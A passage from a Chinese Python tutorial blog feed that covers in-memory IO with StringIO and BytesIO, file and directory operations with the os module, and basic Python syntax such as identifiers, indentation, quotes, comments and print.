<p>由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：</p>
<p>第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；</p>
<p>另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。</p>
<p>很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。</p>
<p>操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。</p>
<p>注意，本章的IO编程都是同步模式，异步IO由于复杂度太高，后续涉及到服务器端程序开发时我们再讨论。</p>
<br>

<p>就单独说一下Python的input()和print()：</p>
<p><strong>input()：</strong> 在控制台把数据输入到内存中，然后从内存中把数据以字符串形式返回给调用处；</p>
<p><strong>print()：</strong> 从内存中输出括号里的相对应的信息。</p>
<br>

<h4 id="2-1-StringIO"><a href="#2-1-StringIO" class="headerlink" title="2.1 StringIO"></a><font color="#3CB371" face="Comic sans MS">2.1 StringIO</font></h4><p>很多时候，数据读写不一定是文件，也可以在<font color="#FF7F00"><strong>内存中</strong></font>读写。</p>
<p>StringIO是IO模块中的类，所以使用的时候要引用模块： <code>from io import StringIO</code></p>
<p>StringIO顾名思义就是<font color="#FF7F00"><strong>在内存中读写str</strong></font>。</p>
<ul>
<li><p>内存中，开辟的一个文本模式的buffer,可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
</ul>
<p><strong>好处：</strong></p>
<p>  一般来说，磁盘的操作比内存的操作要慢得多；内存足够的情况下，一般的优化思路是少落地，减少磁盘IO的过程，可以大大提高程序的运行效率。</p>
<blockquote>
<p><strong>使用到的方法：</strong></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>StringIO()：</strong></font>创建一个StringIO对象，类似文件的<code>open()</code>方法，创建的这个对象要赋值给一个变量；</li>
<li><font color="#FF7F00"><strong>f.write(‘String’)：</strong></font>将字符String写入到内存，返回写入的字节数（一个字符按一个字节算）；</li>
<li><font color="#FF7F00"><strong>f.getvalue(size)：</strong></font>从内存中读取size个字节（一个字符按一个字节算），若无参数则读取全部字节；</li>
<li><font color="#FF7F00"><strong>f.readable()：</strong></font>判断IO是否可读；</li>
<li><font color="#FF7F00"><strong>f.writable()：</strong></font>判断IO是否可写；</li>
<li><font color="#FF7F00"><strong>f.seekable()：</strong></font>指针是否可操作。</li>
</ul>
<p>要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="comment">#内存中构建</span></span><br><span class="line">f = StringIO()<span class="comment">#像文件对象一样操作  这里一定要赋值给一个变量!</span></span><br><span class="line">print(f.readable(), f.writable(), f.seekable())</span><br><span class="line">f.write(<span class="string">&quot;Hello\nPython&quot;</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">print(f.readline())</span><br><span class="line">print(f.getvalue())<span class="comment">#无视指针，输出全部内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line">Hello</span><br><span class="line"></span><br><span class="line">Hello</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-BytesIO"><a href="#2-2-BytesIO" class="headerlink" title="2.2 BytesIO"></a><font color="#3CB371" face="Comic sans MS">2.2 BytesIO</font></h4><p>StringIO操作的只能是str，如果要操作<font color="#FF7F00"><strong>二进制数据</strong></font>，就需要使用BytesIO。</p>
<p>BytesIO是IO模块中的类，所以使用的时候要引用模块：<code>from io import BytesIO</code></p>
<ul>
<li><p>内存中，开辟的一个二进制模式的buffer，可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
<li><p>使用到的方法和StringIO一样，不过一个读的是字符一个读的是字节。</p>
</li>
</ul>
<br>

<p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">ff = BytesIO()</span><br><span class="line">print(ff.readable(), ff.writable(), ff.seekable())</span><br><span class="line">ff.write(<span class="string">b&#x27;Hello\nPython&#x27;</span>)</span><br><span class="line">ff.write(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ff.seek(<span class="number">0</span>)</span><br><span class="line">print(ff.readline())</span><br><span class="line">print()</span><br><span class="line">print(ff.getvalue())</span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line"><span class="string">b&#x27;Hello\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;Hello\nPython\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>


<br>

<p><strong>file-like对象</strong></p>
<p>类文件对象，可以像文件对象一样操作；</p>
<p>socket对象，输入输出对象(stdin、stdout)都是类文件对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"></span><br><span class="line">f = stdout</span><br><span class="line">print(type(f))</span><br><span class="line">f.write(<span class="string">&quot;90data.net&quot;</span>)</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_io</span>.<span class="title">TextIOWrapper</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">90<span class="title">data</span>.<span class="title">net</span></span></span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-操作目录"><a href="#三-操作目录" class="headerlink" title="三. 操作目录"></a><font color="#FF6347" face="Comic sans MS">三. 操作目录</font></h3><p>如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如dir、cp等命令。</p>
<p>如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的<font color="#FF7F00"><strong>os模块</strong></font>也可以直接<font color="#FF7F00"><strong>调用操作系统提供的接口函数</strong></font>。</p>
<p><font face="Comic sans MS"><font color="#00B2EE">具体方法：[<a href="http://www.runoob.com/python3/python3-os-file-methods.html">Python3 OS 文件/目录方法</a>]</font><br></font></p>
<p>打开Python交互式命令行，我们来看看如何使用os模块的基本功能：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">print(os.name)    <span class="string">&#x27;&#x27;&#x27;如果是posix，说明系统是Linux、Unix或Mac OS X，</span></span><br><span class="line"><span class="string">                   如果是nt，就是Windows系统。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.uname()        <span class="string">&#x27;&#x27;&#x27;注意uname()函数在Windows上不提供，也就是说，</span></span><br><span class="line"><span class="string">                     os模块的某些函数是跟操作系统相关的。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ        <span class="string">&#x27;&#x27;&#x27;在操作系统中定义的环境变量，全部保存在os.environ</span></span><br><span class="line"><span class="string">                     这个变量中&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ.get(<span class="string">&#x27;key&#x27;</span>)  <span class="string">&#x27;&#x27;&#x27;要获取某个环境变量的值，可以调用os.environ.get(&#x27;key&#x27;)，</span></span><br><span class="line"><span class="string">                        如os.environ.get(&#x27;PATH&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(os.path.abspath(<span class="string">&#x27;.&#x27;</span>))   <span class="string">&#x27;&#x27;&#x27;查看当前目录的绝对路径:&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<p><strong>操作文件和目录</strong></p>
<p>操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查看当前目录的绝对路径:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.abspath(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael&#x27;</span></span><br><span class="line">在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/Users/michael&#x27;</span>, <span class="string">&#x27;testdir&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael/testdir&#x27;</span></span><br><span class="line">然后创建一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.mkdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">删掉一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rmdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同</span><br><span class="line">操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part<span class="number">-1</span>/part<span class="number">-2</span></span><br><span class="line"></span><br><span class="line">而Windows下会返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part<span class="number">-1</span>\part<span class="number">-2</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以</span><br><span class="line">把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分</span><br><span class="line">为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">文件操作使用下面的函数。假定当前目录下有一个test.txt文件：</span><br><span class="line"></span><br><span class="line"> 对文件重命名:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rename(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line"> 删掉文件:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.remove(<span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们</span><br><span class="line">通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。</span><br><span class="line"></span><br><span class="line">幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是</span><br><span class="line">os模块的补充。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isdir(x)]</span><br><span class="line">[<span class="string">&#x27;.lein&#x27;</span>, <span class="string">&#x27;.local&#x27;</span>, <span class="string">&#x27;.m2&#x27;</span>, <span class="string">&#x27;.npm&#x27;</span>, <span class="string">&#x27;.ssh&#x27;</span>, <span class="string">&#x27;.Trash&#x27;</span>, <span class="string">&#x27;.vim&#x27;</span>, <span class="string">&#x27;Applications&#x27;</span>, <span class="string">&#x27;Desktop&#x27;</span>, ...]</span><br><span class="line">要列出所有的.py文件，也只需一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isfile(x) <span class="keyword">and</span> os.path.splitext(x)[<span class="number">1</span>]==<span class="string">&#x27;.py&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;apis.py&#x27;</span>, <span class="string">&#x27;config.py&#x27;</span>, <span class="string">&#x27;models.py&#x27;</span>, <span class="string">&#x27;pymonitor.py&#x27;</span>, <span class="string">&#x27;test_db.py&#x27;</span>, <span class="string">&#x27;urls.py&#x27;</span>, <span class="string">&#x27;wsgiapp.py&#x27;</span>]</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-序列化"><a href="#四-序列化" class="headerlink" title="四. 序列化"></a><font color="#FF6347" face="Comic sans MS">四. 序列化</font></h3><p>参读资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143192607210600a668b5112e4a979dd20e4661cc9c97000">廖雪峰的官方网站 序列化</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/yyds/p/6563608.html">Python之数据序列化（json、pickle、shelve）</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/zhangxinqi/p/8034380.html">python3之序列化（pickle&amp;json&amp;shelve）</a>》</font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础语法</title>
    <url>/post/Python-Grammar/</url>
    <content><![CDATA[<p>请务必注意，Python程序是<font color="#FF7F00"><strong>大小写敏感</strong></font>的，如果写错了大小写，程序会报错。</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础语法</font> </center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一-标识符"><a href="#一-标识符" class="headerlink" title="一. 标识符"></a><font color="#FF6347" face="Comic sans MS">一. 标识符</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、标识符定义规则</strong></font></p>
<ol>
<li><p>在 Python 里，标识符由<font color="#FF7F00"><strong>字母</strong></font>、<font color="#FF7F00"><strong>数字</strong></font>、<font color="#FF7F00"><strong>下划线</strong></font>组成。</p>
</li>
<li><p>在 Python 中，所有标识符<font color="#FF7F00"><strong>不能以数字开头</strong></font>。</p>
</li>
<li><p>Python 中的标识符<font color="#FF7F00"><strong>是区分大小写的</strong></font>。</p>
</li>
<li><p>以<font color="#FF7F00"><strong>下划线开头</strong></font>的标识符是<font color="#FF7F00"><strong>有特殊意义</strong></font>的。</p>
<ol>
<li>以单下划线开头 <code>_foo</code> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入。</li>
<li>以双下划线开头的 <code>__foo</code> 代表类的私有成员，以双下划线开头和结尾的 <code>__foo__ </code>代表 Python 里特殊方法专用的标识，如 <code>__init__()</code> 代表类的构造函数。</li>
</ol>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python 保留字符</strong></font></p>
<p>下面的列表显示了在Python中的保留字。这些保留字<font color="#FF7F00"><strong>不能用作常数或变数，或任何其他标识符名称</strong></font>。</p>
<p>|||<br>:-:|:-:|:-:|<br>and    |exec    |not<br>assert    |finally    |or<br>break    |for    |pass<br>class    |from    |print<br>continue    |global    |raise<br>def    |if    |return<br>del    |import    |try<br>elif    |in    |while<br>else    |is    |with<br>except    |lambda    |yield</p>
<br>

<h3 id="二-缩进-代码块"><a href="#二-缩进-代码块" class="headerlink" title="二. 缩进(代码块)"></a><font color="#FF6347" face="Comic sans MS">二. 缩进(代码块)</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、注意事项：</strong></font></p>
<ol>
<li><p>学习 Python 与其他语言最大的区别就是，Python 的<font color="#FF7F00"><strong>代码块不使用大括号 <code>&#123;&#125;</code> 来控制类，函数以及其他逻辑判断</strong></font>。python 最具特色的就是<font color="#FF7F00"><strong>用缩进来写模块</strong></font>。</p>
</li>
<li><p>缩进的空白数量是可变的，但是<font color="#FF7F00"><strong>所有代码块语句必须包含相同的缩进空白数量</strong></font>，<strong>这个必须严格执行</strong>！！！</p>
<ol>
<li>按照约定俗成的管理，应该始终坚持使用<font color="red"><strong>4个空格</strong></font>的缩进；</li>
<li>很多Python程序员都建议每行不超过80字符（最多79个见多）；</li>
<li>要将程序的不同部分分开，可使用空行，但不要在程序文件中过多地使用空行</li>
</ol>
</li>
</ol>
<br>

<p>以下代码将会执行错误：<strong>缩进空白数量不一样会报错！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;True&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="comment"># 没有严格缩进，在执行时会报错</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">执行以上代码，会出现如下错误提醒：</span><br><span class="line">$ python test.py  </span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">                ^</span><br><span class="line">IndentationError: unindent does <span class="keyword">not</span> match any outer indentation level</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、多个语句构成代码块</strong></font></p>
<ol>
<li><p>Python不像C/C++/Java一样一条语句是以<code>;</code>结束，而是<font color="#FF7F00"><strong>换行即表示一个语句结束</strong></font>。</p>
</li>
<li><p>缩进相同的一组语句构成一个<strong>代码块</strong>，我们称之代码组。</p>
</li>
<li><p>像if、while、def和class这样的复合语句，<strong>首行以关键字开始</strong>，<strong>以冒号( <code>:</code> )结束</strong>，该行之后的一行或多行缩进代码构成代码组。注意这里冒号( <code>:</code> )不能省略。</p>
</li>
</ol>
<br>

<p>如下实例的冒号不能省略：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> expression : </span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">elif</span> expression :  </span><br><span class="line">   suite  </span><br><span class="line"><span class="keyword">else</span> :  </span><br><span class="line">   suite </span><br></pre></td></tr></table></figure>



<br>

<h3 id="三-一行和多行语句"><a href="#三-一行和多行语句" class="headerlink" title="三. 一行和多行语句"></a><font color="#FF6347" face="Comic sans MS">三. 一行和多行语句</font></h3><blockquote>
<p><font color="red"><strong>一行</strong></font>分为：</p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>同一行显示多条语句</strong></font>;</li>
<li>将一行的语句分为多行显示(<font color="#FF7F00"><strong>一条语句以多行来书写</strong></font>)也包括在多行语句里面来讲。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 同一行显示多条语句</strong></font></p>
<p>Python可以在同一行中使用多条语句，语句之间<strong>使用分号( <code>;</code> )分割</strong>，以下是一个简单的实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">runoob</span><br></pre></td></tr></table></figure>



<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 一条语句以多行来书写</strong></font></p>
<p>看下面的多行语句即可，是同一个意思。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 多行语句</strong></font></p>
<blockquote>
<p><font color="red"><strong>多行</strong></font>：</p>
</blockquote>
<ol>
<li>Python语句中一般<font color="#FF7F00"><strong>以新行作为语句的结束符</strong></font>，但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，斜杠（  <code>\</code> ）称为<code>多行连接符</code>。</li>
<li>语句中包含 [], {} 或 () 括号就<strong>不需要</strong>使用多行连接符。</li>
</ol>
<ol>
<li><font color="#FF7F00"><strong>Python语句中一般以新行作为语句的结束符</strong></font>。但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，如下所示：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">days = [<span class="string">&#x27;Monday&#x27;</span>, <span class="string">&#x27;Tuesday&#x27;</span>, <span class="string">&#x27;Wednesday&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Thursday&#x27;</span>, <span class="string">&#x27;Friday&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h3 id="四-引号"><a href="#四-引号" class="headerlink" title="四. 引号"></a><font color="#FF6347" face="Comic sans MS">四. 引号</font></h3><ol>
<li><p>Python 可以使用单引号( <code>&#39;</code> )、双引号( <code>&quot;</code> )、三引号( <code>&#39;&#39;&#39;</code> 或 <code>&quot;&quot;&quot;</code> ) <strong>来表示字符串</strong>，引号的开始与结束必须的相同类型的。</p>
</li>
<li><p><strong>其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，</strong><font color="#FF7F00"><strong>被当做注释</strong></font>。</p>
</li>
</ol>
<p>如下示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;word&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>


<br>

<h3 id="五-注释"><a href="#五-注释" class="headerlink" title="五. 注释"></a><font color="#FF6347" face="Comic sans MS">五. 注释</font></h3><ol>
<li><font color="#FF7F00"><strong>python中单行注释采用 <code>#</code> 开头。</strong></font></li>
<li>python 中多行注释使用三个单引号( <code>&#39;&#39;&#39;</code> )或三个双引号( <code>&quot;&quot;&quot;</code> )。</li>
</ol>
<p>单行注释,如下示例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个注释</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Hello, Python!&quot;</span>  <span class="comment"># 第二个注释</span></span><br></pre></td></tr></table></figure>

<br>
多行注释,如下示例2：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="六-空行"><a href="#六-空行" class="headerlink" title="六. 空行"></a><font color="#FF6347" face="Comic sans MS">六. 空行</font></h3><blockquote>
<ol>
<li>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</li>
<li>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于<font color="#FF7F00"><strong>分隔两段不同功能或含义的代码，便于日后代码的维护或重构</strong></font>。</li>
<li>记住：<font color="#FF7F00"><strong>空行也是程序代码的一部分</strong></font>。</li>
</ol>
</blockquote>
<p>什么是空行？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">2</span>+<span class="number">3</span></span><br><span class="line">print(a)</span><br><span class="line">           <span class="comment">#这里就是空行</span></span><br><span class="line">b=a+<span class="number">3</span></span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>


<br>

<h3 id="七-输出-print"><a href="#七-输出-print" class="headerlink" title="七. 输出(print)"></a><font color="#FF6347" face="Comic sans MS">七. 输出(print)</font></h3><p>Python3.0以后的输出使用<code>print()</code>函数。分为<strong>换行输出</strong>和<strong>不换行输出</strong>。<br>在print()括号中加上字符串，就可以向屏幕上输出指定的文字。括号里还可以放表达式等……</p>
<blockquote>
<ol>
<li><strong>换行输出：</strong><font color="#FF7F00"><strong>print 默认输出是换行的</strong></font></li>
<li><strong>不换行输出：</strong>将括号里的所有参数输出在一行，只需要<font color="#FF7F00"><strong>在每一个参数后面加一个<code>,</code></strong></font>即可。<strong>注意：</strong></li>
</ol>
</blockquote>
<ol>
<li>最后一个参数后面没有<code>,</code>，也就是和普通函数使用一样；</li>
<li>参数中间的<code>,</code>输出来是一个空格。如下：<ol start="3">
<li>循环输出变量b的时候如果不换行，可在后面加个<code>end=&#39; &#39;</code>，即<code>print(b, end=&#39; &#39;)</code></li>
</ol>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;Thequickbrownfox&#x27;</span>, <span class="string">&#x27;jumpsover&#x27;</span>, <span class="string">&#x27;thelazydog&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Thequickbrownfox jumpsover thelazydog </span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="7-1-输出的补充"><a href="#7-1-输出的补充" class="headerlink" title="7.1 输出的补充"></a><font color="#3CB371" face="Comic sans MS">7.1 输出的补充</font></h4><blockquote>
<p><font face="Microsoft YaHei" color="#FF7F00">Python的三种输出：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Python两种输出值的方式: 表达式语句和<code>print()</code>函数；</font><ol>
<li><font face="Microsoft YaHei">如果你希望输出的形式更加多样，可以使用 <code>str.format()</code> 函数来格式化输出值。</font></li>
<li><font face="Microsoft YaHei">如果你希望将输出的值转成字符串，可以使用 <code>repr()</code> 或 <code>str()</code> 函数来实现</font>.</li>
</ol>
</li>
<li><font face="Microsoft YaHei">第三种方式是使用文件对象的<code> write()</code> 方法，标准输出文件可以用<code>sys.stdout</code>引用</font>！</li>
</ol>
<br>

<h4 id="7-2-输出时常用的函数"><a href="#7-2-输出时常用的函数" class="headerlink" title="7.2 输出时常用的函数"></a><font color="#3CB371" face="Comic sans MS">7.2 输出时常用的函数</font></h4><ul>
